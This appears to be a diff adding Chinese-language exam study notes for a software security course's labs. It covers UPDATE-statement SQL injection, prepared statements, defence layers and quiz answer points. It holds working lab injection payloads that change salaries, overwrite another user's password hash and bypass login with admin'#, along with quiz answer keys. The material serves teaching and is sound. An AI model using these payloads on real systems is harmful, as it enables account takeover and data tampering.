+<h3>6.3 UPDATE 注入：一次改三样</h3>
+<p>编辑资料的 SQL 是 <code>UPDATE credential SET nickname='$nick', email='$email', … WHERE ID=$id;</code>。把 <code>nickname</code> 填成带引号的值，就能「关掉」当前字段、插入自己的赋值：</p>
+<table>
+<tr><th style="width:22%">目标</th><th style="width:40%">nickname 输入</th><th style="width:38%">拼出来的效果</th></tr>
+<tr><td>改自己的工资</td><td><code>', salary='1000000</code></td><td><code>SET nickname='', salary='1000000', email=… WHERE ID=1</code></td></tr>
+<tr><td>改别人的工资</td><td><code>', salary=1 WHERE name='Boby'; #</code></td><td>前半句无效，另起 <code>WHERE name='Boby'</code>，末尾注释掉原 <code>WHERE ID=</code></td></tr>
+<tr><td>改别人的密码</td><td><code>', Password='7c4a8d09…' WHERE name='Boby';#</code></td><td>直接把 Boby 的密码哈希换成 <code>sha1("123456")</code></td></tr>
+</table>
+<p class="small">注意最后的 <code>#</code>：不注释掉原句末尾的 <code>WHERE ID=$id</code>，语句会在第一个人身上生效而不是 Boby。</p>
+
+<h3>6.4 防御：Prepared Statement 为什么有效</h3>
+<div class="fig">
+<div style="display:flex; gap:2.5mm; text-align:left; font-size:8.6pt; line-height:1.45">
+  <div style="flex:1; border:0.6pt solid #1d4ed8; background:#dbe9ff; padding:2mm; border-radius:1mm">
+    <b style="color:#1d4ed8">① 编译（prepare）</b><br>
+    解析 → 编译 → 优化 → 缓存<br>
+    <span style="font-family:Consolas;font-size:8pt">WHERE name=? and Password=?</span>
+  </div>
+  <div style="flex:1; border:0.6pt solid #8a6d00; background:#fff3cd; padding:2mm; border-radius:1mm">
+    <b style="color:#8a6d00">② 绑定（bind）</b><br>
+    把用户输入作为<b>纯数据</b>填入<br>
+    不再参与语法解析
+  </div>
+  <div style="flex:1; border:0.6pt solid #2e7d32; background:#e8f5e9; padding:2mm; border-radius:1mm">
+    <b style="color:#2e7d32">③ 执行（execute）</b><br>
+    语句结构已经固定<br>
+    输入里的 <span style="font-family:Consolas;font-size:8pt">'#</span> 只是字符串
+  </div>
+</div>
+<div style="margin-top:2mm; background:#f4f4f4; padding:1.8mm 2.5mm; text-align:left; font-size:8.4pt">
+  关键：<b>编译发生在数据到达之前</b>。骨架里只有占位符 <code>?</code>，数据后填，永远无法改变已经被编译好的语句结构。于是 <code>admin'#</code> 会被当成「名字叫 <code>admin'#</code> 的用户」去查，查不到 → 登录失败。
+</div>
+<div class="cap">图 11　Prepared Statement：先编译骨架，再绑定数据，代码与数据彻底分开</div>
+</div>
+<pre>$stmt = $conn-&gt;prepare("SELECT id, name, eid, salary, ssn
+                        FROM credential WHERE name=? and Password=?");
+$stmt-&gt;bind_param("ss", $input_uname, $hashed_pwd);   // "ss" = 两个字符串
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();</pre>
+<p><b>其他防御</b>：输入白名单/类型校验；<code>mysqli_real_escape_string</code> / PDO 转义（治标）；数据库账户<b>最小权限</b>（不给 <code>DROP</code>、不给改他人行）；<b>错误信息不回显</b>（避免报错注入）；关掉多语句查询。</p>
+
+<h2>7　五次小测的知识点补充</h2>
+<p>小测和实验报告是同一套知识的不同切面：实验里「做出来」，小测里「说清楚」。下面把五次小测的<b>问法</b>和<b>给分点</b>对回上面的章节。</p>
+
+<table>
+<tr><th style="width:16%">小测</th><th style="width:30%">考什么</th><th style="width:54%">答案落点（对应章节）</th></tr>
+<tr><td>① 格式化字符串</td><td>两个候选返回地址 A1/A2，构造一次输入都命中；禁用 <code>%n</code>；要写每步累计字符数</td><td>§4.4。要点：两个地址都覆盖、<code>B−C=0x40</code> 换算参数位、<code>%hhn</code> 逐字节、差值必须单调递增（不够 +256）</td></tr>
+<tr><td>② Meltdown / Spectre</td><td>写攻击程序并解释关键步骤；两者共同点与不同点</td><td>§3.2–3.4。共同点：乱序执行 + 侧信道；不同点：内核 vs 沙盒、<b>要不要训练</b></td></tr>
+<tr><td>③ Set-UID（lstat）</td><td>程序员「拒绝软链+查属主就安全」对不对；构造时序；加一次 lstat 够不够；换链接能否写到别的文件</td><td>§2.4。(a) 错，A 指向自己的普通文件、C 指向 /etc/protected；(c) 不够，仍有窗口；(d) 不能，<code>fp</code> 绑定 inode，应用 <code>fstat</code></td></tr>
+<tr><td>④ Set-UID（reportdesk）</td><td>找出程序里的漏洞并给出攻击</td><td>§2.5。三个：前缀穿越、fd 泄漏（本题有 <code>O_CLOEXEC</code> 故不成立）、<code>REPORT_AUDIT</code> 任意写</td></tr>
+<tr><td>⑤ 栈溢出</td><td>如何得到 str/buffer 地址；用栈图构造一次成功的输入；地址给全时怎么算</td><td>§1.4。<code>offset = ebp − buf + 4</code>；ebp 被打码 → 所有槽位都填；<code>0x104</code> 那个例子</td></tr>
+<tr><td>⑥ XSS（LAB6）</td><td>为什么要 ts/token；About me 能不能注；为什么要跳过自己</td><td>§5.3–5.4。绕过 CSRF；该字段被转义只当文本；防止覆盖自己的蠕虫</td></tr>
+<tr><td>⑦ SQL（LAB7）</td><td>怎么绕过登录；为什么多语句失败；怎么改别人密码；prepared 为什么有效</td><td>§6。<code>admin'#</code>；<code>mysqli::query</code> 不支持多语句；写 <code>sha1</code> 值；先编译后绑定</td></tr>
+</table>
+
+<h3>7.1 通用防御矩阵（答「如何防御」时按这四层说）</h3>
+<table>
+<tr><th style="width:14%">层次</th><th style="width:44%">手段</th><th style="width:42%">对应哪个实验</th></tr>
+<tr><td><b>输入</b></td><td>长度检查、白名单、上下文相关转义（HTML / SQL / shell）</td><td>LAB2 / LAB5 / LAB6 / LAB7 全适用</td></tr>
+<tr><td><b>内存</b></td><td>canary、NX、ASLR、PIE、不用 <code>printf(fmt)</code>、栈上不放可执行代码</td><td>LAB2 / LAB5</td></tr>
+<tr><td><b>权限</b></td><td>最小权限（Set-UID 用完即降权、DB 账户只读所需表）、<code>O_CLOEXEC</code>、<code>O_NOFOLLOW</code>、<code>protected_symlinks</code>、用 <code>fstat</code>/<code>openat</code> 代替「先按名字检查」</td><td>LAB3 / LAB7</td></tr>
+<tr><td><b>Web / 硬件</b></td><td>CSP（<code>script-src 'self'</code> + nonce，禁 <code>unsafe-inline</code>）、HttpOnly cookie、CSRF token、Prepared Statement、KPTI / <code>lfence</code></td><td>LAB4 / LAB6 / LAB7</td></tr>
+</table>
+
+<h3>7.2 十条最容易丢分的细节</h3>
+<ol class="small">
+<li><b>offset 一定要 +4/+8</b>：buffer 到 ret 之间还隔着「保存的 ebp」。</li>
+<li><b>小端</b>：写地址时低字节在前，<code>to_bytes(4,'little')</code> 别写成 big。</li>
+<li><b>64 位 shellcode 与 32 位不通用</b>（<code>\xcd\x80</code> vs <code>\x0f\x05</code>，寄存器也不同）。</li>
+<li><b>TOCTOU 的答案永远是「检查与使用不是同一个时刻」</b>，加一次检查只是缩小窗口，不消除。</li>
+<li><b><code>fp</code> 一旦打开就绑定 inode</b>，此后换路径名不影响它——这是 (d) 的标准答案。</li>
+<li><b><code>_mm_clflush</code> 是 Spectre 成立的前提</b>，删掉成功率断崖式下降，原因要能说出「不清缓存就不用投机」。</li>
+<li><b>Spectre 的 max 从 1 开始</b>，否则 0 号页会抢占最高分。</li>
+<li><b><code>%n</code> 写的是「已输出字符数」</b>；大数必须先拆字节，且写序按数值递增。</li>
+<li><b>XSS 的 token 不是「没用」，而是「正好能被同源脚本读到」</b>——这是它防不住 XSS 的原因。</li>
+<li><b>SQL 注入改密码要写哈希值</b>（<code>7c4a8d09…</code> = <code>sha1("123456")</code>），写明文不生效。</li>
+</ol>
+
+<h3>7.3 答题模板（任何一道攻击题都能套）</h3>
+<div class="def">
+<b>① 漏洞点</b>：哪一行代码、缺了什么检查（<code>strcpy</code> 不查长度 / <code>printf(msg)</code> / 字符串拼 SQL / <code>access</code>+<code>fopen</code> / 未转义输出）。<br>
+<b>② 触发条件</b>：攻击者能控制什么、需要什么权限、有没有窗口。<br>
+<b>③ 具体构造</b>：payload 字节、时序图、SQL 串、脚本代码——<b>这里给分最密，尽量写全</b>。<br>
+<b>④ 后果</b>：读到什么 / 写到哪个文件 / 执行了什么代码。<br>
+<b>⑤ 修复</b>：对应 7.1 矩阵里的哪一层，并说明<b>为什么有效</b>（拦住的是哪一步）。
+</div>
+
+<hr>
+<p class="small" style="color:#777">配套材料：<b>SFS-cheatsheet.pdf</b>（双面 A4 速查，考前背）＋本讲义（理解用）。内容取自 LAB2–LAB7 实验报告、五次小测题目与手写答案、LAB6/LAB7 官方中文实验指导。</p>
+
+</body>
+</html>
